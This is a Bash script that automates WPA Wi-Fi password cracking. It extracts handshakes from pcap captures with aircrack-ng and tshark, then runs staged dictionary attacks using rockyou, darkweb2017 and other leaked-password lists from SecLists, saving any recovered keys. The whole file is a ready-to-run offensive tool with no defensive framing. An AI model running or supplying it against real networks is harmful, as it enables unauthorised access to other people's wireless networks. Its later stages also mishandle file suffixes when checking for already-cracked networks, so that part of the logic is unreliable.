#!/bin/bash
#settings

#Passlist taken from https://github.com/danielmiessler/SecLists

wordlist1="SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt"
wordlist2="SecLists/Passwords/darkweb2017-top10000.txt"
wordlist3="SecLists/Passwords/Leaked-Databases/rockyou-70.txt"
wordlist4="SecLists/Passwords/xato-net-10-million-passwords.txt"

#Directory where the pcap files are stored
PCAPDIR="handshakes"
#DIR = name of the folder to store extracted handshakes in as a subfolder for PCAPDIR
#Folder is created if it's missing
DIR="$PCAPDIR/Extracted-handshakes"

ISDIRCREATED=0
   
AIRCRACK_TIMEOUT=2 # given time to the aircrack-ng program to read the file. Time is specified in seconds
# If you have a very large file or a very slow system, increase this value currently not in use


 
clear
echo "+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+"
echo "|A|i|r|c|r|a|c|k| |A|u|t|o|m|a|t|e|d|"
echo "+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+"
echo
echo "1. Use Default Wordlists(probable-v2-wpa-top4800, darkweb2017-top10000, rockyou-70, xato-net-10-million-password)."
echo "2. Exit."
read option
if [ $option == "1" ]; then

	echo "Start"
			
else
   exit
fi

for FILE in $PCAPDIR/*.pcap ; do
	  
	while read -r "line" ; do
	if [ "$(echo "$line" | grep 'WPA' | grep -E -v '(0 handshake)' | grep -E 'WPA \(' | awk -F '  ' '{print $3}')" ]; then
		if [ $ISDIRCREATED -eq 0 ]; then
		    mkdir ./$DIR || (echo "It is not possible to create a directory for saving handshakes. Quitting." && exit 1)
		    ISDIRCREATED=1
		fi
		ESSID="$(echo "$line" | grep 'WPA' | grep -E -v '(0 handshake)' | grep -E 'WPA \(' | awk -F '  ' '{print $3}')"
		BSSID="$(echo "$line" | grep 'WPA' | grep -E -v '(0 handshake)' | grep -E 'WPA \(' | awk -F '  ' '{print $2}')"
		echo -e "\033[0;32mFound a handshake for the network $ESSID ($BSSID). Saved to file $DIR/\033[1m$ESSID.pcap\e[0m"
		tshark -r $FILE -R "(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05 || eapol) && wlan.addr == $BSSID" -2 2>/dev/null
		tshark -r $FILE -R "(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05 || eapol) && wlan.addr == $BSSID" -2 -w ./$DIR/"$ESSID.pcap" -F pcap 2>/dev/null
	fi
	#done < <(timeout $AIRCRACK_TIMEOUT aircrack-ng $FILE)
	done < <(aircrack-ng $FILE)

echo "done reading:" $FILE
done
echo start craking
for pcap in $DIR/*.pcap ; do

	if [ ! -f "${pcap%.pcap}.passfile" ] ; then
		 if [ ! -f "${pcap%.pcap}.wordlist1" ]; then
			aircrack-ng -w $wordlist1 $pcap -l ${pcap%.pcap}.passfile
			mv  "$pcap" "${pcap%.pcap}.wordlist1"
		fi
	fi
done

clear
echo "done cracking whith passlist:"$wordlist1
echo "continue whith passlist:"$wordlist2
echo "1: yes 2: no"
read option

if [ $option == "1" ] ; then
	echo "starting"
else
	exit
fi

for pcap in $DIR/*.wordlist1 ; do

	if [ ! -f "${pcap%.pcap}.passfile" ] ; then
		 if [ ! -f /"${pcap%.pcap}.wordlist2" ]; then
			aircrack-ng -w $wordlist2 $pcap -l ${pcap%.pcap}.passfile
			mv  "$pcap" "${pcap%.wordlist1}.wordlist2"
		fi
	fi
done

clear
echo "done cracking whith passlist:"$wordlist2
echo "continue whith passlist:"$wordlist3
echo "1: yes 2: no"
read option

if [ $option == "1" ] ; then
	echo "starting"
else
	exit
fi

for pcap in $DIR/*.wordlist2 ; do

	if [ ! -f "${pcap%.pcap}.passfile" ] ; then
		 if [ ! -f "${pcap%.pcap}.wordlist3" ]; then
			aircrack-ng -w $wordlist3 $pcap -l ${pcap%.pcap}.passfile
			mv  "$pcap" "${pcap%.wordlist2}.wordlist3"
		fi
	fi
done

clear
echo "done cracking whith passlist:"$wordlist3
echo "continue whith passlist:"$wordlist4
echo "1: yes 2: no"
read option

if [ $option == "1" ] ; then
	echo "starting"
else
	exit
fi

for pcap in $DIR/*.wordlist3 ; do

	if [ ! -f "${pcap%.pcap}.passfile" ] ; then
		 if [ ! -f "${pcap%.pcap}.wordlist4" ]; then
			aircrack-ng -w $wordlist4 $pcap -l ${pcap%.pcap}.passfile
			mv  "$pcap" "${pcap%.wordlist3}.wordlist4"
		fi
	fi
done

echo done!
